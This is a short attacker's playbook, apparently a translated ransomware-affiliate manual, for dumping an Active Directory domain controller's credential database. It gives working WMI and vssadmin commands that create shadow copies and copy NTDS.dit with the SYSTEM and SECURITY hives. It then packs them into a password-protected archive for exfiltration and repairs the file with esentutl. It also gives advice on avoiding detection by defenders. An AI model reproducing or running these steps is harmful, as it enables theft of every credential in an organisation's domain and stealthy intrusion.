The method of a non-zero NTDS DUMP
shell wmic /node: "DC01" /user: "DOMAIN\admin" /password: "cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"


we make a request for the listing of shadow copies, there is an indication of the date, check that there is a fresh date
almost certainly they are already there, if not, we do it ourselves

net start Volume Shadow Copy
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"


next, in the listing of shadow copies, we find the latest
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
accordingly, we need the copy number for the next command


shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\"


in c:\temp\log \ ntds.dit / security / system files should fall
we take a portable console 7z and pack it into an archive with a password
Code: [Select]

7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD


we download the password-protected archive for ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following


Esentutl /p C:\log\ntds.dit


the trick of this method is that we don't actually dump anything, we just take and pump out
the ntds so as not to get burned by the fact that we pull out the ntds, we pack it into a password-protected archive

if you have problems with the fact that they shoot and throw them out of the network after the ntds dump , try this method
it can be burned only by the fact of some leaking date from the CD, and it is impossible to analyze what exactly you are dragging without knowing the password from the archive
